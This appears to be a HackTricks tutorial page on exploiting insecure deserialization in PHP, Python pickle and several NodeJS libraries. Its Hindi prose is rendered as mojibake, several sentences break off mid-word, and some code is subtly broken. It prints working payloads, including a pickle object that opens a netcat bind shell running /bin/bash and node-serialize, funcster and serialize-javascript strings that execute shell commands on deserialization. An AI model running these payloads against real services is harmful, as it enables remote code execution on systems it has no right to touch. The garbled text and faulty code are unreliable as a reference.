# рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks рдФрд░ HackTricks Cloud** github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>


## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**рд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рдХреЛ рдПрдХ рд╡рд┐рдзрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ рдРрд╕реЗ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╛ рддреЛ рдСрдмреНрдЬ
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
рдпрджрд┐ рдЖрдк рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреА рджрд┐рд╢рд╛ рджреЗрдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди **`__wakeup`** рдФрд░ **`__destruct`** рдХреЛ рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ **`__toString`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ **рдЕрдм рдпрд╣ рд╣реЛ рдирд╣реАрдВ рд░рд╣рд╛ рд╣реИ**ред

{% hint style="warning" %}
рдпрджрд┐ рдпрд╣ рдХреНрд▓рд╛рд╕ рдореЗрдВ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд╡рд┐рдзрд┐ **`__unserialize(array $data)`** рдХреЛ **`__wakeup()` рдХреЗ рдмрдЬрд╛рдп** рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдСрдмреНрдЬ
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

рдЖрдк рдпрд╣рд╛рдБ **PHP рдЙрджрд╛рд╣рд░рдг** рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), рдпрд╣рд╛рдБ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) рдпрд╛ рдпрд╣рд╛рдБ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

рдЖрдк PHP autoload functionality рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рднрд┐рдиреНрди php рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЕрдзрд┐рдХ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### рд╕рдВрджрд░реНрднрд┐рдд рдорд╛рдиреЛрдВ рдХреЛ Serialize рдХрд░рдирд╛

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдЖрдк рдХрд┐рд╕реА рдорд╛рди рдХреЛ **рдПрдХ рдЕрдиреНрдп рдорд╛рди рдХреЗ serialize рд╣реБрдП рд╕рдВрджрд░реНрдн** рдХреЗ рд░реВрдк рдореЗрдВ serialize рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) рдЖрдкрдХреЛ PHP рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП payloads рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдореЗрдВ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк **рдмрд╛рд╣рд░реА PHP рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдХреЛрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рддреЛ, рдЕрдЧрд░ рд╕рдВрднрд╡ рд╣реЛ рддреЛ, рд╕рд░реНрд╡рд░ рдХрд╛ `phpinfo()` рдЬрд╛рдВрдЪреЗрдВ рдФрд░ **рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ** (рдФрд░ **PHPGGC** рдХреЗ **рдЧреИрдЬреЗрдЯреНрд╕** рдкрд░ рднреА) рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯ рдЬрд┐рдирдХрд╛ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### phar:// metadata deserialization

рдЕрдЧрд░ рдЖрдкрдиреЗ рдПрдХ LFI рдкрд╛рдпрд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рднреАрддрд░ PHP рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**file\_get\_contents(), fopen(), file() рдпрд╛ file\_exists(), md5\_file(), filemtime() рдпрд╛ filesize()**_ рдХреА рддрд░рд╣ рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рддреЛ рдЖрдк **phar** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдлрд╝рд╛рдЗрд▓** рдкрдврд╝рддреЗ рд╕рдордп рд╣реЛ рд░рд╣реА **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

рдЬрдм рдСрдмреНрдЬ
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **pickle jails** рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдЙрди python рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдореЗрдВ **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ** рдХреА рддрдХрдиреАрдХ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **Pickle, PyYAML, jsonpickle рдФрд░ ruamel.yaml** рдХреЗ рд▓рд┐рдП RCE рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **PHP рдпрд╛ Python рдХреА рддрд░рд╣ "рдЬрд╛рджреВ" рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ** рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдХреБрдЫ **рдлрд╝рдВрдХреНрд╢рди** рд╣реИрдВ рдЬреЛ **рд╕реАрдзреЗ рдирд╣реАрдВ рдХрд╣рддреЗ рд╣реБрдП рднреА рдЕрдХреНрд╕рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ **`toString`**, **`valueOf`**, **`toJSON`**ред\
рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдиреНрдп рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ)ред

рдПрдХ рдФрд░ **"рдЬрд╛рджреВ" рддрд░реАрдХрд╛ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрдзреЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдП рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП** рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдПрдХ рдЕрд╕рд┐рдВрдХ рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдкреНрд░рдорд┐рд╕)ред рдХреНрдпреЛрдВрдХрд┐, рдЕрдЧрд░ рдЖрдк рдЙрд╕ **рд╡рд╛рдкрд╕реА рдСрдмреНрдЬ
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` рдФрд░ `prototype` рдкреНрд░рджреВрд╖рдг

рдпрджрд┐ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рджреЗрдЦреЗрдВ**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ serialize рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**рд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреНрдб рдСрдмреНрдЬ
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
рдЖрдк рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ serialize рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ `_$$ND_FUNC$$_` рдзреНрд╡рдЬ рд╕реАрд░реАрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬ
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рд▓рд╛рдЗрдмреНрд░реЗрд░реА `_$$ND_FUNC$$_` рдХреЗ рдмрд╛рдж рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧреА рдФрд░ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЗрд╕реЗ рдЪрд▓рд╛рдПрдЧреА**ред рдЗрд╕рд▓рд┐рдП, **рдХреЛрдб рд╕реНрд╡рдд: рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк **рдлрдВрдХреНрд╢рди рдирд┐рд░реНрдорд╛рдг** рднрд╛рдЧ рдФрд░ рдЕрдВрддрд┐рдо рдмреНрд░реИрдХреЗрдЯ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдПрдХ JS рд╡рдирд▓рд╛рдЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
рдЖрдк рдЗрд╕ **[рдпрд╣рд╛рдБ](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)** рд╡реБрд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреЛ рдХреИрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### [funcster](https://www.npmjs.com/package/funcster)

**funcster** рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рдпрд╣ рд╣реИ рдХрд┐ **рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рдХреА рдЕрдкреНрд░рд╛рдкреНрдпрддрд╛; рд╡реЗ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рджрд╛рдпрд░реЗ рдХреЗ рдмрд╛рд╣рд░ рд╣реИрдВред рдпрд╣ рдкреНрд░рддрд┐рдмрдВрдз рдХрд┐рд╕реА рднреА рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд░реЛрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдЕрдкрд╡рд╛рдж рдЬреИрд╕реЗ рдХрд┐ `"ReferenceError: console is not defined"` рдЬрдм рдЖрдк `console.log()` рдпрд╛ `require(something)` рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред

рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╡реИрд╢рд┐рд╖реНрдЯреНрдпрдкреВрд░реНрдг рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЛ рдкреВрд░реА рдкрд╣реБрдВрдЪ рдХреА рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рднреА рдорд╛рдирдХ рдЗрдирдмрд┐рд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреНрд▓реЛрдмрд▓ рд╕рдВрджрд░реНрдн рдХрд╛ рд╕реАрдзрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдпрд╣ рд╕рдВрднрд╡ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдирд┐рдкреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣реБрдВрдЪ рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╕реНрд░реЛрдд рдХреЛ рдкрдврд╝реЗрдВ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**ред**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** рдкреИрдХреЗрдЬ рдХреЛ рдХреЗрд╡рд▓ рд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ рднреА рдмрд┐рд▓реНрдЯ-рдЗрди рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреНрд╖рдорддрд╛рдПрдБ рдирд╣реАрдВ рд╣реИрдВред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рдЦреБрдж рдХреА рд╡рд┐рдзрд┐ рдХрд╛ рдЕрдорд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдЙрджрд╛рд╣рд░рдг рджреНрд╡рд╛рд░рд╛ `eval` рдХрд╛ рд╕реАрдзрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрдЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдЖрд╕рд╛рдиреА рд╕реЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
